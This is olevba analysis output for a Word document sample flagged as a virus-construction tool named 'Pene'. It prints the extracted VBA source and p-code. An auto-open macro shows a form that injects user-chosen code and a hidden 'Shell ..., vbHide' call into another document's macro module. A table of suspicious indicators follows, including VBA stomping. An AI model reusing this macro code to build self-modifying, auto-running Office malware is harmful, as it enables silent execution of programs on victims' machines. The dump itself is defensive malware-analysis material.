olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./VirTool.MSWord.Pene
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./VirTool.MSWord.Pene - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Instructor.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Instructor.frm 
in file: ./VirTool.MSWord.Pene - OLE stream: 'Macros/VBA/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
On Error GoTo RepErr
Restart:
Penetr = InputBox("Where is the file 'Penetrator.bas' ?")
If Penetr = "" Then Exit Sub
IsHere = Dir(Penetr & "\Penetrator.bas")
If UCase(IsHere) <> "PENETRATOR.BAS" Then
    MsgBox Penetr & "\Penetrator.bas" & Chr(13) & "file not found"
    GoTo Restart
End If
Set Penetrator = Documents("Penetrator.doc").VBProject.VBComponents(1).CodeModule
Penetrator.DeleteLines 1, Penetrator.CountOfLines
Penetrator.AddFromFile (Penetr & "\Penetrator.bas")
For i = 1 To Penetrator.CountOfLines
    If Left(Penetrator.Lines(i, 1), 3) = "'UC" Then
        Penetrator.InsertLines i + 1, Instructor.userCode.Text
    ElseIf Left(Penetrator.Lines(i, 1), 3) = "'SP" Then
        Penetrator.InsertLines i + 1, "Shell " & Instructor.userProggy.Text & ", vbHide"
    End If
Next i
Exit Sub
RepErr:
MsgBox Err.Description
MsgBox "Make sure that you loaded a file called 'Penetrator.doc' !!"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./VirTool.MSWord.Pene
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4222 bytes
' Line #0:
' 	FuncDefn (Private Sub ResetMe())
' Line #1:
' 	Ld UserForm 
' 	ArgsMemCall Parent 0x0000 
' Line #2:
' 	EndSub 
' Macros/VBA/Instructor - 4301 bytes
' Line #0:
' 	FuncDefn (Private Sub vbprojects())
' Line #1:
' 	OnError Err 
' Line #2:
' 	Label UCase 
' Line #3:
' 	LitStr 0x0024 "Where is the file 'Penetrator.bas' ?"
' 	ArgsLd bas 0x0001 
' 	St _B_var_Penetr 
' Line #4:
' 	Ld _B_var_Penetr 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #5:
' 	Ld _B_var_Penetr 
' 	LitStr 0x000F "\Penetrator.bas"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St _B_var_IsHere 
' Line #6:
' 	Ld _B_var_IsHere 
' 	ArgsLd _B_var_UCase 0x0001 
' 	LitStr 0x000E "PENETRATOR.BAS"
' 	Ne 
' 	IfBlock 
' Line #7:
' 	Ld _B_var_Penetr 
' 	LitStr 0x000F "\Penetrator.bas"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd _B_var_Chr 0x0001 
' 	Concat 
' 	LitStr 0x000E "file not found"
' 	Concat 
' 	ArgsCall SetFocus 0x0001 
' Line #8:
' 	GoTo UCase 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Penetrator.doc"
' 	ArgsLd _B_var_Set 0x0001 
' 	MemLd VBComponents 
' 	ArgsMemLd VCC 0x0001 
' 	MemLd CodeModule 
' 	Set _B_var_Open 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld _B_var_Open 
' 	MemLd DeleteLines 
' 	Ld _B_var_Open 
' 	ArgsMemCall InsertLines 0x0002 
' Line #12:
' 	Ld _B_var_Penetr 
' 	LitStr 0x000F "\Penetrator.bas"
' 	Concat 
' 	Paren 
' 	Ld _B_var_Open 
' 	ArgsMemCall _B_var_if 0x0001 
' Line #13:
' 	StartForVariable 
' 	Ld _B_var_i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld _B_var_Open 
' 	MemLd DeleteLines 
' 	For 
' Line #14:
' 	Ld _B_var_i 
' 	LitDI2 0x0001 
' 	Ld _B_var_Open 
' 	ArgsMemLd CountOfLines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "'UC"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	Ld _B_var_i 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld UserForm 
' 	MemLd Label2 
' 	MemLd Then 
' 	Ld _B_var_Open 
' 	ArgsMemCall Add 0x0002 
' Line #16:
' 	Ld _B_var_i 
' 	LitDI2 0x0001 
' 	Ld _B_var_Open 
' 	ArgsMemLd CountOfLines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "'SP"
' 	Eq 
' 	ElseIfBlock 
' Line #17:
' 	Ld _B_var_i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0006 "Shell "
' 	Ld UserForm 
' 	MemLd CommandButton1 
' 	MemLd Then 
' 	Concat 
' 	LitStr 0x0008 ", vbHide"
' 	Concat 
' 	Ld _B_var_Open 
' 	ArgsMemCall Add 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld _B_var_i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	ExitSub 
' Line #21:
' 	Label Err 
' Line #22:
' 	Ld Description 
' 	MemLd _B_var_Left 
' 	ArgsCall SetFocus 0x0001 
' Line #23:
' 	LitStr 0x003B "Make sure that you loaded a file called 'Penetrator.doc' !!"
' 	ArgsCall SetFocus 0x0001 
' Line #24:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�individual code: (leave it like it is, if you don't know how to use it)
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�path and program name:F
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Setup
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�by Lord Arz       Lord_Arz@gmx.net
-------------------------------------------------------------------------------
VBA FORM STRING IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'userCode'" IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Rem'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'userProggy'" IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './VirTool.MSWord.Pene' - OLE stream: 'Macros/Instructor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

